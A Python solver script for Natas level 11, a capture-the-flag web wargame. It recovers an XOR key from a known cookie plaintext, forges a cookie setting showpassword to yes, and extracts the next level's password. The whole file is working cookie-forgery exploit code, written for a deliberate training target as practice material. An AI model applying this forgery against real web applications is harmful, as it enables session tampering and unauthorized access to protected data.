import re
from src.natas.base_level import NatasLevel
import base64
import os
import sys
import urllib.parse

class Level_11(NatasLevel):

  num = 11
  explanation = "On this level, we extract the default cookie, recover the XOR key\n     using the known plaintext, and forge a new cookie with `showpassword=yes`."

  def exploit(self) -> str:

    resp    = self.session.get(self.base_url)
    cookies = urllib.parse.unquote(resp.cookies.get_dict()['data'])

    def xor_encrypt(text, key):

      return ''.join(chr(ord(text[i]) ^ ord(key[i % len(key)])) for i in range(len(text)))

    cookie_b64  = cookies
    ciphertext  = base64.b64decode(cookie_b64).decode('latin1')
    plaintext   = '{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'
    key         = xor_encrypt(ciphertext, plaintext)[:4]
    newplain    = '{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'
    newcookie   = base64.b64encode(xor_encrypt(newplain, key).encode('latin1')).decode()

    resp_cookie = self.session.get(self.base_url, headers = {'Cookie': f'data={newcookie}'})

    match       = re.search(r"natas12 is (\S+)", resp_cookie.text).group(1).strip().replace("<br>", "")

    return match

